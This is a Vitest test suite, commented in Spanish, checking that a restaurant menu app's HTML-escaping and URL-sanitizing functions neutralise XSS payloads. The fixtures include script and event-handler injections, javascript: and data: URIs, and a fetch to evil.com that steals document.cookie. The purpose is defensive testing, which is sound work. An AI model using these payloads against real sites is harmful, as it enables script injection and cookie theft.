/**
 * Suite de Pruebas: Seguridad y Mitigación Contextual de XSS en Cliente (Etapa 19)
 *
 * Valida:
 * 1. Funciones de sanitización contextual: escapeHtml, escapeHtmlAttr, sanitizeUrl, sanitizeGooglePlaceId.
 * 2. Payloads XSS maliciosos en categorías, nombres de platos, descripciones y tags.
 * 3. URLs maliciosas (javascript:, data:text/html, vbscript:, protocol-relative //).
 * 4. Payloads en respuestas y sugerencias del Sommelier IA.
 * 5. Payloads en googlePlaceId para enlaces de Google Review.
 * 6. Preservación íntegra de acentos, eñes, comillas legítimas (O'Hara, Café & Bar).
 * 7. Inspección estática del código fuente de apps/client-web/app.js para verificar
 *    ausencia de sinks innerHTML no sanitizados con variables de usuario.
 */

import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';
import {
  escapeHtml,
  escapeHtmlAttr,
  sanitizeUrl,
  sanitizeGooglePlaceId
} from '@mesaya/shared';

describe('Etapa 19 — Mitigación Contextual de XSS en Cliente', () => {

  // ══════════════════════════════════════════════════════════════════════
  // BLOQUE 1: Utilidades puras de sanitización contextual (@mesaya/shared)
  // ══════════════════════════════════════════════════════════════════════
  describe('Bloque 1: Sanitización Contextual en @mesaya/shared', () => {
    it('escapeHtml neutraliza etiquetas y caracteres de inyección', () => {
      const dangerous = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(dangerous);
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('</script>');
      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    });

    it('escapeHtml maneja img onerror y cierres de tags', () => {
      const dangerous = '<img src=x onerror=alert(1)>';
      const escaped = escapeHtml(dangerous);
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('>');
      expect(escaped).toBe('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('escapeHtml preserva acentos, eñes y caracteres legítimos de español', () => {
      const legitimate = 'Ñoquis caseros al Malbec con salsa de champiñones';
      expect(escapeHtml(legitimate)).toBe(legitimate);
    });

    it('escapeHtmlAttr escapa comillas dobles, simples y backticks', () => {
      const dangerousAttr = 'x" onmouseover="alert(1)" `';
      const escaped = escapeHtmlAttr(dangerousAttr);
      expect(escaped).not.toContain('"');
      expect(escaped).not.toContain('`');
      expect(escaped).toContain('&quot;');
      expect(escaped).toContain('&#96;');
    });

    it('sanitizeUrl rechaza esquemas peligrosos javascript:, data:, vbscript:', () => {
      expect(sanitizeUrl('javascript:alert(1)', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('JAVASCRIPT:alert(1)', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('javascript:/*--></title></style></textarea>*/<svg/onload=alert()>', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('vbscript:msgbox("XSS")', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('file:///etc/passwd', 'fallback')).toBe('fallback');
    });

    it('sanitizeUrl rechaza URLs protocol-relative //evil.com', () => {
      expect(sanitizeUrl('//evil.com/malicious.js', 'fallback')).toBe('fallback');
    });

    it('sanitizeUrl rechaza bypasses de normalización con barra invertida (P1 Codex)', () => {
      expect(sanitizeUrl('/\\evil.example/x', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('/\\\\evil.example/x', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('/\\/\\evil.example/x', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('\\\\evil.example/x', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('.\\assets\\test.jpg', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('https:\\\\evil.example/test.jpg', 'fallback')).toBe('fallback');
    });

    it('sanitizeUrl rechaza hosts externos no permitidos por la allowlist (P2 Codex)', () => {
      expect(sanitizeUrl('https://evil.example/x', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('https://attacker.com/malicious.png', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('http://phishing-restaurant.com/menu.pdf', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('https://raw.githubusercontent.com/payload.js', 'fallback')).toBe('fallback');
    });

    it('sanitizeUrl rechaza credenciales embebidas y puertos no estándar según esquema', () => {
      expect(sanitizeUrl('https://admin:secret@images.unsplash.com/photo-1', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('https://images.unsplash.com:8443/photo-1', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('http://images.unsplash.com:8080/photo-1', 'fallback')).toBe('fallback');
      // Puertos cruzados no estándar por esquema (P1 Codex)
      expect(sanitizeUrl('https://images.unsplash.com:80/photo-1', 'fallback')).toBe('fallback');
      expect(sanitizeUrl('http://images.unsplash.com:443/photo-1', 'fallback')).toBe('fallback');
    });

    it('sanitizeUrl admite URLs HTTP y HTTPS legítimas dentro de la allowlist', () => {
      const httpUrl = 'http://images.unsplash.com/photo-12345';
      const httpsUrl = 'https://images.unsplash.com/photo-12345?format=auto&w=800';
      const plusUrl = 'https://plus.unsplash.com/premium_photo-1661';
      expect(sanitizeUrl(httpUrl)).toBe(httpUrl);
      expect(sanitizeUrl(httpsUrl)).toBe(httpsUrl);
      expect(sanitizeUrl(plusUrl)).toBe(plusUrl);
      // Puertos por defecto explícitos coincidentes con su protocolo se admiten y canonicalizan
      expect(sanitizeUrl('https://images.unsplash.com:443/photo-12345')).toBe('https://images.unsplash.com/photo-12345');
      expect(sanitizeUrl('http://images.unsplash.com:80/photo-12345')).toBe('http://images.unsplash.com/photo-12345');
    });

    it('sanitizeUrl admite rutas relativas locales seguras', () => {
      expect(sanitizeUrl('/assets/images/restaurantes/pastas.jpg')).toBe('/assets/images/restaurantes/pastas.jpg');
      expect(sanitizeUrl('./assets/images/cafeterias/espresso.jpg')).toBe('./assets/images/cafeterias/espresso.jpg');
    });

    it('sanitizeGooglePlaceId valida caracteres alfanuméricos y rechaza inyecciones', () => {
      expect(sanitizeGooglePlaceId('ChIJN1t_tDeuEmsRUsoyG83frY4')).toBe('ChIJN1t_tDeuEmsRUsoyG83frY4');
      expect(sanitizeGooglePlaceId('place-123_abc')).toBe('place-123_abc');
      // Inyecciones
      expect(sanitizeGooglePlaceId('123"><script>alert(1)</script>')).toBeNull();
      expect(sanitizeGooglePlaceId('javascript:alert(1)')).toBeNull();
      expect(sanitizeGooglePlaceId('ChIJN1t\' OR 1=1--')).toBeNull();
      expect(sanitizeGooglePlaceId(null)).toBeNull();
      expect(sanitizeGooglePlaceId(undefined)).toBeNull();
    });
  });

  // ══════════════════════════════════════════════════════════════════════
  // BLOQUE 2: Simulación de renderizado seguro de Menú y Categorías
  // ══════════════════════════════════════════════════════════════════════
  describe('Bloque 2: Sanitización de Menú, Categorías y Platos', () => {
    it('Categoría con payload no inyecta HTML activo en las pills', () => {
      const maliciousCat = {
        name: 'Pastas <script>alert("XSS")</script>',
        icon: '🍝<img src=x onerror=alert(1)>'
      };

      const safeHtml = `
        <button data-category="dynamic-cat-0" class="btn-category-pill">
          <span>${escapeHtml(maliciousCat.icon || '🍽️')}</span> ${escapeHtml(maliciousCat.name)}
        </button>
      `;

      expect(safeHtml).not.toContain('<script>');
      expect(safeHtml).not.toContain('<img src=x onerror');
      expect(safeHtml).toContain('&lt;script&gt;');
      expect(safeHtml).toContain('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('Plato con payload en nombre, descripción y precio se renderiza de forma neutralizada', () => {
      const maliciousItem = {
        id: 'dish-1" onfocus="alert(1)',
        name: 'Bife de Chorizo <svg/onload=alert(1)>',
        description: 'Corte tradicional "><script>alert(document.cookie)</script>',
        price: 15000,
        imageUrl: 'javascript:alert("XSS")',
        isFeatured: true
      };

      const formattedPrice = `$${Number(maliciousItem.price).toLocaleString('es-AR')}`;
      const defaultImg = 'https://images.unsplash.com/photo-1555396273-367ea4eb4db5';
      const imgUrl = sanitizeUrl(maliciousItem.imageUrl, defaultImg);
      const safeDishId = escapeHtmlAttr(maliciousItem.id);
      const safeName = escapeHtml(maliciousItem.name);
      const safeAlt = escapeHtmlAttr(maliciousItem.name);
      const safeDesc = escapeHtml(maliciousItem.description);

      const renderedCard = `
        <div data-dish-id="${safeDishId}" class="card-dish-story">
          <img src="${imgUrl}" alt="${safeAlt}" />
          <h4>${safeName}</h4>
          <p>${safeDesc}</p>
          <span>${formattedPrice}</span>
        </div>
      `;

      // Verificaciones de seguridad
      expect(renderedCard).not.toContain('javascript:alert');
      expect(renderedCard).toContain(defaultImg); // fallback usado
      expect(renderedCard).not.toContain('<svg/onload');
      expect(renderedCard).not.toContain('<script>');
      expect(renderedCard).toContain('&lt;svg/onload=alert(1)&gt;');
      expect(renderedCard).toContain('&lt;script&gt;');
      expect(renderedCard).not.toContain('onfocus="alert(1)"'); // atributo roto neutralizado
    });
  });

  // ══════════════════════════════════════════════════════════════════════
  // BLOQUE 3: Simulación de respuestas del Sommelier IA
  // ══════════════════════════════════════════════════════════════════════
  describe('Bloque 3: Sanitización de Respuestas del Sommelier IA', () => {
    it('Pregunta del usuario con payload no inyecta HTML al renderizar el bubble', () => {
      const userQuery = '¿Qué vino recomendás? <script>fetch("http://evil.com/steal?c="+document.cookie)</script>';
      // En app.js se renderiza usando userCard.textContent = q
      // Simulamos la verificación equivalente con textContent
      const div = { textContent: '' };
      div.textContent = userQuery;
      expect(div.textContent).toBe(userQuery); // No se evalúa como HTML
    });

    it('Respuesta de IA con payload no ejecuta tags HTML', () => {
      const maliciousAiResponse = {
        answer: 'Te recomiendo el Malbec Reserva <img src=x onerror="steal()">',
        suggestedPairing: 'Copa de vino <script>alert("pairing")</script>',
        suggestedDishes: [
          {
            id: 'dish-ai-1',
            name: 'Ravioles <b onmouseover="alert(1)">Caseros</b>',
            price: 12000,
            imageUrl: 'data:text/html,<script>alert(1)</script>'
          }
        ]
      };

      // Simulación de los guards de app.js:
      // 1. answerP.textContent = data.answer
      const safeAnswer = escapeHtml(maliciousAiResponse.answer);
      expect(safeAnswer).not.toContain('<img src=x');

      // 2. pairingSpan.textContent = data.suggestedPairing
      const safePairing = escapeHtml(maliciousAiResponse.suggestedPairing);
      expect(safePairing).not.toContain('<script>');

      // 3. Plato sugerido: imageUrl sanitizada con sanitizeUrl
      const safeImg = sanitizeUrl(maliciousAiResponse.suggestedDishes[0].imageUrl, '');
      expect(safeImg).toBe(''); // Rechazado data: URI
    });
  });

  // ══════════════════════════════════════════════════════════════════════
  // BLOQUE 4: Inspección Estática de apps/client-web/app.js
  // ══════════════════════════════════════════════════════════════════════
  describe('Bloque 4: Inspección Estática de Ausencia de Inyección en app.js', () => {
    const appJsPath = path.resolve(__dirname, '../../../apps/client-web/app.js');
    const appJsContent = fs.readFileSync(appJsPath, 'utf8');

    it('app.js define e implementa escapeHtml, escapeHtmlAttr y sanitizeUrl con allowlist', () => {
      expect(appJsContent).toContain('function escapeHtml(');
      expect(appJsContent).toContain('function escapeHtmlAttr(');
      expect(appJsContent).toContain('const ALLOWED_IMAGE_HOSTS = new Set([');
      expect(appJsContent).toContain('function sanitizeUrl(');
      expect(appJsContent).toContain("trimmed.includes('\\\\')");
      expect(appJsContent).toContain('function sanitizeGooglePlaceId(');
    });

    it('showToast utiliza nodos DOM seguros y textContent', () => {
      // No debe contener toast.innerHTML con interpolación
      expect(appJsContent).not.toMatch(/toast\.innerHTML\s*=/);
      expect(appJsContent).toContain('msgSpan.textContent');
    });

    it('openDishDetailSheet sanitiza la imagen con sanitizeUrl y no usa innerHTML con interpolación', () => {
      expect(appJsContent).toContain('sanitizeUrl(item.imageUrl');
      expect(appJsContent).toContain('tagsEl.appendChild(');
    });

    it('Pills y Story cards usan escapeHtml y sanitizeUrl para renderizar datos', () => {
      expect(appJsContent).toContain('escapeHtml(cat.name)');
      expect(appJsContent).toContain('sanitizeUrl(item.imageUrl');
      expect(appJsContent).toContain('escapeHtml(item.name)');
    });

    it('Menú modal usa escapeHtml y sanitizeUrl en todas sus plantillas', () => {
      expect(appJsContent).toContain('const safeName = escapeHtml(item.name)');
      expect(appJsContent).toContain('const safeDesc = escapeHtml(item.description');
      expect(appJsContent).toContain('const safeAlt = escapeHtmlAttr(item.name)');
    });

    it('Sommelier IA no usa innerHTML para renderizar la respuesta del modelo ni preguntas del usuario', () => {
      expect(appJsContent).not.toMatch(/aiBubble\.innerHTML\s*=\s*`[\s\S]*?\${data\.answer}/);
      expect(appJsContent).toContain('answerP.textContent = data.answer');
    });

    it('Enlace de Google Review valida googlePlaceId con sanitizeGooglePlaceId', () => {
      expect(appJsContent).toContain('sanitizeGooglePlaceId(config.googlePlaceId)');
      expect(appJsContent).not.toContain('reviewBtn.href = `https://search.google.com/local/writereview?placeid=${config.googlePlaceId}`');
    });
  });
});
